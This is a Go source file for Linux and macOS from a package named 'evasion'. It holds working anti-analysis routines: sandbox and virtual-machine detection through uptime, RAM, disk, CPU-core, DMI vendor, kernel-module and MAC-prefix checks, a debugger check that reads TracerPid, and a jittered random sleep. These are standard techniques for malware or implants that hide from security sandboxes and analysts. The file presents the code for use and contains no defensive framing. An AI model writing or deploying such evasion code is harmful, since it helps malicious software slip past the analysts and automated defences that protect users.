//go:build linux || darwin

package evasion

import (
	"crypto/rand"
	"math/big"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// AntiSandbox performs multiple checks to detect if running in a sandbox/VM.
// Returns true if the environment appears to be a real machine.
func AntiSandbox() bool {
	checks := []func() bool{
		checkUptime,
		checkRAM,
		checkDiskSize,
		checkCPUCores,
		checkVMFiles,
		checkMACAddress,
	}

	passed := 0
	for _, check := range checks {
		if check() {
			passed++
		}
	}

	return passed >= 4
}

// checkUptime verifies the system has been running for a reasonable time.
func checkUptime() bool {
	data, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return true
	}

	var uptimeSec float64
	fields := strings.Fields(string(data))
	if len(fields) == 0 {
		return true
	}
	uptimeSec, err = strconv.ParseFloat(fields[0], 64)
	if err != nil {
		return true
	}

	// Require at least 5 minutes uptime
	return uptimeSec > 300
}

// checkRAM verifies sufficient RAM is available.
func checkRAM() bool {
	data, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return true
	}

	// Parse MemTotal
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "MemTotal:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				var kb int64
				for _, c := range fields[1] {
					if c >= '0' && c <= '9' {
						kb = kb*10 + int64(c-'0')
					}
				}
				// Require at least 1GB
				return kb > 1048576
			}
		}
	}

	return true
}

// checkDiskSize verifies sufficient disk space.
func checkDiskSize() bool {
	var stat syscall.Statfs_t
	err := syscall.Statfs("/", &stat)
	if err != nil {
		return true
	}

	// Available blocks * block size
	available := stat.Bavail * uint64(stat.Bsize)
	// Require at least 5GB free
	return available > 5*1024*1024*1024
}

// checkCPUCores verifies sufficient CPU cores.
func checkCPUCores() bool {
	return runtime.NumCPU() >= 2
}

// checkVMFiles looks for VM indicator files.
func checkVMFiles() bool {
	vmFiles := []string{
		"/proc/bus/pci",
		"/sys/class/dmi/id/product_name",
		"/sys/class/dmi/id/sys_vendor",
	}

	for _, f := range vmFiles {
		data, err := os.ReadFile(f)
		if err != nil {
			continue
		}

		content := strings.ToLower(string(data))
		if strings.Contains(content, "virtualbox") ||
			strings.Contains(content, "vmware") ||
			strings.Contains(content, "qemu") ||
			strings.Contains(content, "xen") {
			return false
		}
	}

	// Check for VM-specific kernel modules
	cmd := exec.Command("lsmod")
	out, err := cmd.Output()
	if err == nil {
		output := strings.ToLower(string(out))
		if strings.Contains(output, "vboxguest") ||
			strings.Contains(output, "vmw_balloon") ||
			strings.Contains(output, "xenbus") {
			return false
		}
	}

	return true
}

// checkMACAddress checks for known VM MAC address prefixes.
func checkMACAddress() bool {
	vmPrefixes := []string{
		"08:00:27", // VirtualBox
		"00:0c:29", // VMware
		"00:50:56", // VMware
		"00:05:69", // VMware
	}

	// Check network interfaces
	ifaces, err := os.ReadDir("/sys/class/net")
	if err != nil {
		return true
	}

	for _, iface := range ifaces {
		macPath := "/sys/class/net/" + iface.Name() + "/address"
		data, err := os.ReadFile(macPath)
		if err != nil {
			continue
		}

		mac := strings.ToLower(strings.TrimSpace(string(data)))
		for _, prefix := range vmPrefixes {
			if strings.HasPrefix(mac, strings.ToLower(prefix)) {
				return false
			}
		}
	}

	return true
}

// AntiDebug performs basic anti-debugging checks for Linux.
func AntiDebug() bool {
	// Check for tracer pid in /proc/self/status
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return true
	}

	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "TracerPid:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 && fields[1] != "0" {
				return false
			}
		}
	}

	return true
}

// SleepWithJitter sleeps for a random duration between min and max.
func SleepWithJitter(min, max time.Duration) {
	delta := max - min
	if delta <= 0 {
		time.Sleep(min)
		return
	}

	randVal, _ := rand.Int(rand.Reader, big.NewInt(delta.Nanoseconds()))
	sleepTime := min + time.Duration(randVal.Int64())
	time.Sleep(sleepTime)
}
